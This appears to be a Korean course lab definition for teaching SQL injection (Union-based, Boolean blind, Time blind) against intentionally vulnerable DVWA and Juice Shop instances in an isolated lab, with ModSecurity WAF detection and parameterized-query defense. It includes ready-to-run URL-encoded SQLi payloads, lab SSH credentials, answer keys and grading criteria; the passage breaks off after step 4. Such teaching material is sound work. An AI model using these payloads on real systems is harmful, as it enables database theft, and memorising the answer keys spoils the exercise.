lab_id: standalone-web-vuln-week05
title: "SQL Injection — Error/Union/Blind vs SQLi 탐지·방어"
version: standalone-web-vuln
course: web-vuln
week: 5
description: |
  SQL Injection 유형별 점검 실습(WSTG-INPV-05). SQLi 는 웹앱이 사용자 입력을 DB 질의에 그대로
  이어붙일 때 입력 속 SQL 문법이 코드로 실행되는 결함이다(OWASP A03). 본 실습은 추출 방식이 다른
  네 유형 — Union-based(결과에 직접), Boolean blind(참/거짓 응답 차이로 추론), Time blind(SLEEP
  지연으로 추론), Error-based(에러 메시지에 노출) — 을 el34 의 취약 웹에 직접 던져 본다. 모든
  페이로드는 공백을 %20, 작은따옴표를 %27 로 URL 인코딩해 전송한다. 같은 요청이 WAF(ModSecurity
  942 룰군)에 잡혀 anomaly score 누적 → 949110 발동 → dvwa 403 으로 차단되는 과정을 modsec_audit.log
  로 확인하고, juice(DetectionOnly)는 같은 페이로드에 200 으로 응답함을 비교한다. 마지막에 모든 유형을
  한 번에 막는 근본 방어 parameterized query 를 정리한다. 공격은 외부 공격자 VM 192.168.0.202(att/1)에서
  공인 진입 192.168.0.161로 — `ssh att@192.168.0.202`(비번 1)로 접속해 수행하고, 탐지 로그 확인은
  `ssh ccc@{{TARGET_IP}}`(el34 호스트) 후 `docker exec -it el34-web bash`. 인가된 실습만.
difficulty: hard
duration_minutes: 170
prerequisites:
  - "W01–W04 통과 (HTTP 기초·점검도구·정찰·인증/세션)"
  - "el34 호스트 SSH(ssh ccc@{{TARGET_IP}}, 비밀번호 1) + docker exec 접근"
  - "lecture §2(네 가지 추출 유형) §3(URL 인코딩 + 942→949110→403 메커니즘) §4(parameterized query 방어) 숙지"
objectives:
  - "Union/Boolean blind/Time blind SQLi 페이로드를 %20·%27 로 URL 인코딩해 대상 vhost 에 전송하고 응답 코드로 결과를 해석한다"
  - "유형별 SQLi 가 ModSec 942 룰군(942100/942160/942190 등)에 잡히는 분포를 modsec_audit.log 로 확인한다"
  - "같은 페이로드가 dvwa(차단 403)와 juice(DetectionOnly 200)에서 다른 결과를 내는 WAF 정책 차이를 비교한다"
  - "SQLi 의 근본 방어가 parameterized query 임을, 입력검증·최소권한·에러숨김·WAF 가 왜 보조인지를 설명한다"
pass_threshold: 0.7
steps:

  - order: 1
    instruction: |
      ## 🎯 목표
      SQLi 점검을 시작하기 전에, 대상 웹앱(dvwa)이 실제로 응답하는지 도달성을 확인한다.
      ## 📖 개념 한 줄
      WSTG 점검자는 본격 공격 전에 항상 대상이 살아 있는지부터 확인한다 — 도달이 안 되면 어떤
      SQLi 도 시작할 수 없다. SQLi 점검 대상은 dvwa(차단 모드)와 juice(탐지 전용) 두 곳이다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.

      ```bash
      # 1) 외부 공격자 VM 192.168.0.202(attacker)에서 dvwa vhost 도달 확인 — 본문 버리고 응답코드만 dvwa= 형식으로
      curl -s -o /dev/null -w 'dvwa=%{http_code}\n' -H 'Host: dvwa.el34.lab' http://192.168.0.161/
      ```
      ## 🔧 도구/옵션 풀이
      - `ssh att@192.168.0.202 (비번 1)` : el34 호스트에서 공격자 컨테이너로 접속해 명령을 실행한다.
      - `curl -s` : 진행 표시를 숨김(silent). `-o /dev/null` : 응답 본문은 버린다(코드만 볼 때).
      - `-w 'dvwa=%{http_code}\n'` : 요청 후 HTTP 응답 코드만 `dvwa=<코드>` 형태로 출력한다.
      - `-H 'Host: dvwa.el34.lab'` : fw 게이트웨이(192.168.0.161)로 보내되 Host 헤더로 dvwa vhost 를 지정.
      ## ✅ 합격 기준
      `dvwa` 출력 시 통과. **근거:** `dvwa=<코드>` 형태로 응답 코드가 찍히면 대상에 도달한 것이고,
      이로써 SQLi 점검을 시작할 수 있다.
    hint: '도달성'
    category: survey
    points: 10
    answer: |
      # 1) 외부 공격자 VM 192.168.0.202(attacker)에서 dvwa vhost 도달 확인 — 본문 버리고 응답코드만 dvwa= 형식으로
      ssh att@192.168.0.202 "curl -s -o /dev/null -w 'dvwa=%{http_code}\n' -H 'Host: dvwa.el34.lab' http://192.168.0.161/"
    answer_detail: "SQLi 점검의 첫 단계 = 대상 도달성 확인. el34 의 SQLi 점검 대상은 dvwa(ModSec 차단 모드, 403)와 juice(DetectionOnly, 200) 두 vhost 다. curl 응답 코드가 출력되면 도달 성공으로 판정한다."
    expected_output: |
      dvwa=302
    verify:
      type: output_contains
      expect: 'dvwa'
      field: stdout
      semantic:
        intent: "대상 점검"
        success_criteria: ["도달"]
        acceptable_methods: ["**[OSS] curl (권장)**"]
    target_vm: web

  - order: 2
    instruction: |
      ## 🎯 목표
      가장 직접적인 추출 기법인 Union-based SQLi 를 dvwa 에 던져, 결과 화면에 다른 테이블
      데이터를 덧붙이려는 시도가 WAF 에 어떻게 잡히는지 본다.
      ## 📖 개념 한 줄
      `UNION SELECT` 는 원래 질의 결과 뒤에 공격자가 고른 다른 데이터를 세로로 이어 붙여 같은
      화면에 직접 빼내는 기법이다. 결과가 곧장 보이므로 가장 빠른 추출이다(lecture §2.1).
      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.

      ```bash
      # 1) Union-based SQLi(1' UNION SELECT user,password FROM users-- -)를 %27·%20 인코딩해 dvwa에 전송 → 응답코드만 union= 형식으로
      curl -s -o /dev/null -w 'union=%{http_code}\n' -H 'Host: dvwa.el34.lab' "http://192.168.0.161/?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--%20-"
      # 2) 해석 — UNION SELECT로 결과에 직접 추출 시도, dvwa는 942→949110으로 403 차단
      echo "→ UNION SELECT로 결과에 직접 데이터 추출 시도. dvwa 403(942 탐지)"
      ```
      ## 🔧 페이로드/인코딩 풀이
      - 원문 페이로드: `1' UNION SELECT user,password FROM users-- -`.
      - URL 인코딩: `%27`=작은따옴표(`'`), `%20`=공백. el34 에서는 **공백을 반드시 `%20`** 으로
        인코딩해야 URL 이 공백에서 잘리지 않고 페이로드가 온전히 전달된다.
      - 끝의 `-- -` : SQL 주석으로, 뒤에 남은 원래 질의 조각을 무력화한다.
      ## ✅ 합격 기준
      `union=` 출력 시 통과. **근거:** `union=403` 이면 dvwa 의 ModSec 이 942(union 패턴)→949110 으로
      차단한 결과로, "여기는 SQLi 를 차단하는 자산"이라는 신호다.
    hint: 'UNION SELECT'
    category: manipulation
    points: 12
    answer: |
      # 1) Union-based SQLi(1' UNION SELECT user,password FROM users-- -)를 %27·%20 인코딩해 dvwa에 전송 → 응답코드만 union= 형식으로
      ssh att@192.168.0.202 "curl -s -o /dev/null -w 'union=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://192.168.0.161/?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--%20-\""
      # 2) 해석 — UNION SELECT로 결과에 직접 추출 시도, dvwa는 942→949110으로 403 차단
      echo "→ UNION SELECT로 결과에 직접 데이터 추출 시도. dvwa 403(942 탐지)"
    answer_detail: "Union-based = UNION SELECT 로 다른 테이블(users) 데이터를 원래 결과 뒤에 이어 붙여 화면에 직접 추출하는 기법. 네 유형 중 가장 직접적·빠르다. 페이로드는 %27(작은따옴표)·%20(공백)으로 URL 인코딩해 전송하며, dvwa(차단 모드)에서는 942→949110 으로 403 차단되는 것이 정상이다."
    expected_output: |
      union=403
      → UNION SELECT로 결과에 직접 데이터 추출 시도. dvwa 403(942 탐지)
    verify:
      type: output_contains
      expect: 'union='
      field: stdout
      semantic:
        intent: "Union SQLi"
        success_criteria: ["UNION 시도"]
        acceptable_methods: ["**[OSS] UNION SELECT (권장)**"]
    target_vm: web

  - order: 3
    instruction: |
      ## 🎯 목표
      결과가 화면에 안 보일 때 쓰는 간접 추론 기법인 Boolean blind 를 juice 에 던져, 참 조건과
      거짓 조건의 응답 차이로 데이터를 추론하는 원리를 체감한다.
      ## 📖 개념 한 줄
      `'1'='1'`(항상 참)과 `'1'='2'`(항상 거짓)에 대한 서버 응답 차이(길이·내용)를 신호로 삼아,
      "예/아니오" 질문을 반복해 데이터를 한 비트씩 좁혀간다 — 느리지만 결과가 안 보여도 추출
      가능하다(lecture §2.2).
      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.

      ```bash
      # 1) 참 조건(1' AND '1'='1)을 juice에 전송 → 응답코드를 true= 로
      curl -s -o /dev/null -w 'true=%{http_code} ' -H 'Host: juice.el34.lab' "http://192.168.0.161/?id=1%27%20AND%20%271%27=%271"
      # 2) 거짓 조건(1' AND '1'='2)을 juice에 전송 → 응답코드를 false= 로(참/거짓만 다르고 나머지 동일)
      curl -s -o /dev/null -w 'false=%{http_code}\n' -H 'Host: juice.el34.lab' "http://192.168.0.161/?id=1%27%20AND%20%271%27=%272"
      # 3) 해석 — 참(1=1)/거짓(1=2) 응답 차이로 1비트씩 추론(결과 노출 없어도 추출)
      echo "→ 참(1=1)/거짓(1=2) 응답 차이로 1비트씩 추론. 결과 노출 없어도 추출 가능"
      ```
      ## 🔧 페이로드/인코딩 풀이
      - 참 조건 원문: `1' AND '1'='1`  /  거짓 조건 원문: `1' AND '1'='2`.
      - `%27`=작은따옴표(`'`), `%20`=공백. 두 요청은 참/거짓만 다르고 나머지는 동일하다.
      - 대상이 juice(DetectionOnly)인 이유 — 차단되지 않아 참/거짓 응답을 끝까지 관찰할 수 있다.
      ## ✅ 합격 기준
      `true=` 출력 시 통과. **근거:** `true=<코드>`/`false=<코드>` 두 응답 코드가 찍히면 Boolean blind
      의 참/거짓 두 요청이 전송된 것으로, 응답 차이로 데이터를 추론할 준비가 된 것이다.
    hint: "AND '1'='1 vs '1'='2"
    category: manipulation
    points: 12
    answer: |
      # 1) 참 조건(1' AND '1'='1)을 juice에 전송 → 응답코드를 true= 로
      ssh att@192.168.0.202 "curl -s -o /dev/null -w 'true=%{http_code} ' -H 'Host: juice.el34.lab' \"http://192.168.0.161/?id=1%27%20AND%20%271%27=%271\""
      # 2) 거짓 조건(1' AND '1'='2)을 juice에 전송 → 응답코드를 false= 로(참/거짓만 다르고 나머지 동일)
      ssh att@192.168.0.202 "curl -s -o /dev/null -w 'false=%{http_code}\n' -H 'Host: juice.el34.lab' \"http://192.168.0.161/?id=1%27%20AND%20%271%27=%272\""
      # 3) 해석 — 참(1=1)/거짓(1=2) 응답 차이로 1비트씩 추론(결과 노출 없어도 추출)
      echo "→ 참(1=1)/거짓(1=2) 응답 차이로 1비트씩 추론. 결과 노출 없어도 추출 가능"
    answer_detail: "Boolean blind = 결과가 화면에 안 보일 때, 참(1=1)/거짓(1=2) 조건에 대한 응답 차이(페이지 길이·내용)로 데이터를 1비트씩 추론하는 간접 기법. Union 보다 느리지만 결과가 직접 노출되지 않는 곳에서도 추출할 수 있다. 참/거짓 두 요청이 모두 전송되면 시도 성공으로 판정한다."
    expected_output: |
      true=200 false=200
      → 참(1=1)/거짓(1=2) 응답 차이로 1비트씩 추론. 결과 노출 없어도 추출 가능
    verify:
      type: output_contains
      expect: 'true='
      field: stdout
      semantic:
        intent: "Boolean blind SQLi"
        success_criteria: ["참/거짓 시도"]
        acceptable_methods: ["**[OSS] AND 1=1/1=2 (권장)**"]
    target_vm: web

  - order: 4
    instruction: |
      ## 🎯 목표
      참/거짓 응답 차이조차 없을 때의 최후 수단인 Time blind 를 dvwa 에 던져, 응답 지연이 곧
      신호가 된다는 것을 체감한다.
      ## 📖 개념 한 줄
      `SLEEP(3)` 으로 DB 가 일부러 멈추게 해, "맞으면 늦게·틀리면 빨리" 응답하도록 만든다.
      화면에 아무 차이가 없어도 응답 시간만으로 참/거짓을 추론한다 — 가장 느린 추출이다(lecture §2.3).
      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.

      ```bash
      # 1) Time blind(1' AND SLEEP(3)-- -)를 dvwa에 전송 → 응답코드(time=)와 총 응답시간(응답시간=초) 출력
      curl -s -o /dev/null -w 'time=%{http_code} 응답시간=%{time_total}s\n' -H 'Host: dvwa.el34.lab' "http://192.168.0.161/?id=1%27%20AND%20SLEEP(3)--%20-"
      # 2) 해석 — SLEEP으로 응답 지연 유발 → 시간차로 추론, dvwa는 SLEEP 패턴을 942로 탐지(403)
      echo "→ SLEEP으로 응답 지연 유발 → 시간차로 추론. WAF가 SLEEP 패턴 탐지(403)"
      ```
      ## 🔧 페이로드/옵션 풀이
      - 원문 페이로드: `1' AND SLEEP(3)-- -`  (`%27`=`'`, `%20`=공백, `-- -`=주석).
      - `-w '... 응답시간=%{time_total}s'` : curl 의 총 응답 시간(초)을 출력해 지연 여부를 관찰하게 한다.
      - dvwa(차단 모드)에서는 SLEEP 패턴이 942(blind 룰)에 잡혀 지연 전에 403 으로 막히는 것이 정상.
      ## ✅ 합격 기준
      `time=` 출력 시 통과. **근거:** `time=<코드>` 와 `응답시간=<초>` 가 찍히면 Time blind(SLEEP)
      페이로드 시도가 수행된 것이고, 응답 시간으로 참/거짓을 추론할 수 있다.
    hint: 'AND SLEEP(3)'
    category: manipulation
    points: 12
    answer: |
      # 1) Time blind(1' AND SLEEP(3)-- -)를 dvwa에 전송 → 응답코드(time=)와 총 응답시간(응답시간=초) 출력
      ssh att@192.168.0.202 "curl -s -o /dev/null -w 'time=%{http_code} 응답시간=%{time_total}s\n' -H 'Host: dvwa.el34.lab' \"http://192.168.0.161/?id=1%27%20AND%20SLEEP(3)--%20-\""
      # 2) 해석 — SLEEP으로 응답 지연 유발 → 시간차로 추론, dvwa는 SLEEP 패턴을 942로 탐지(403)
      echo "→ SLEEP으로 응답 지연 유발 → 시간차로 추론. WAF가 SLEEP 패턴 탐지(403)"
    answer_detail: "Time blind = SLEEP() 등으로 응답을 일부러 지연시켜, 응답이 늦으면 참·빠르면 거짓으로 시간차 추론하는 기법. 응답 차이도 에러도 없는 가장 어려운 환경의 최후 수단이라 가장 느리다. dvwa 차단 모드에서는 SLEEP 패턴이 942 에 탐지되어 403 으로 막히며, time= 코드와 응답시간= 이 출력되면 시도 성공으로 판정한다."
